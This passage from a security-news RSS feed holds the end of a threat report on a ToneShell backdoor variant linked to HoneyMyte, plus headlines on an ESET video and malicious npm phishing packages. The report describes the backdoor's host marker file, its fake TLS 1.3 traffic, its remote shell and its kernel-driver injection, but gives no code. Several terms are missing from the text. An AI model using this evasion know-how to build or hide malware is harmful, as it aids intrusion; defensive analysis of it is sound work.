a host identifier. In contrast, this version checks for a file named C:\ProgramData\MicrosoftOneDrive.tlb, validating a 4-byte marker inside it. If the file is absent or the marker is invalid, the backdoor derives a new pseudo-random 4-byte identifier using system-specific values (computer name, tick count, and PRNG), then creates the file and writes the marker. This becomes the unique ID for the infected host.The samples we have analyzed contact two command-and-control servers:ToneShell communicates with its C2 over raw TCP on port 443 while disguising traffic using . This version imitates the first bytes of a TLS 1.3 record () instead of the TLS 1.2 pattern used previously. After this three-byte marker, each packet contains a size field and an encrypted payload. Fake TLS marker Payload length Encrypted with a rolling XOR keyThe backdoor supports a set of remote operations, including file upload/download, remote shell functionality, and session control. The command set includes:Create temporary file for incoming dataEstablish remote shell via pipeWe assess with high confidence that the activity described in this report is linked to the  threat actor. This conclusion is supported by the use of the  backdoor as the final-stage payload, as well as the presence of additional tools long associated with HoneyMyte – such as , and the  USB worm – on the impacted systems.HoneyMyte’s 2025 operations show a noticeable evolution toward using  to deploy ToneShell, improving both stealth and resilience. In this campaign, we observed a new ToneShell variant delivered through a kernel-mode driver that carries and injects the backdoor directly from its embedded payload. To further conceal its activity, the driver first deploys a small user-mode component that handles the final injection step. It also uses multiple obfuscation techniques, callback routines, and notification mechanisms to hide its API usage and track process and registry activity, ultimately strengthening the backdoor’s defenses.Because the shellcode executes entirely in memory,  becomes essential for uncovering and analyzing this intrusion. Detecting the injected shellcode is a key indicator of ToneShell’s presence on compromised hosts.To protect themselves against this threat, organizations should:By following these recommendations, organizations can reduce their risk of being compromised by the HoneyMyte APT group and other similar threats.]]></content:encoded></item><item><title>This month in security with Tony Anscombe – December 2025 edition</title><link>https://www.welivesecurity.com/en/videos/month-security-tony-anscombe-december-2025/</link><author></author><category>threatintel</category><pubDate>Mon, 29 Dec 2025 10:00:00 +0000</pubDate><source url="https://www.welivesecurity.com/">ESET WeLiveSecurity</source><content:encoded><![CDATA[As 2025 draws to a close, Tony looks back at the cybersecurity stories that stood out both in December and across the whole of this year]]></content:encoded></item><item><title>27 Malicious npm Packages Used as Phishing Infrastructure to Steal Login Credentials</title><link>https://thehackernews.com/2025/12/27-malicious-npm-packages-used-as.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjbarqmk-H0SfVP8X3eR-wcY-UAzQs4vgDfk6mZCaOhgsKNAmf1pLBT_CfB6bMSHARl1UMwvkmd1SL9INOF4KyHSMr7eCO4lWF6745uHql2CwA4iWIGik-6yynnmPNOjdNi9FMXD6pCx3GIJ8T8em0Y6kvg-98a8AuatSM9Ql4zgApKEPOP1pySjfOrblmd/s1600/npm-login.jpg" length="" type=""/><pubDate>Mon, 29 Dec 2025 09:44:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Cybersecurity researchers have disclosed details of what has been described as a "sustained and targeted" spear-phishing campaign that has published over two dozen packages to the npm registry to facilitate credential theft.
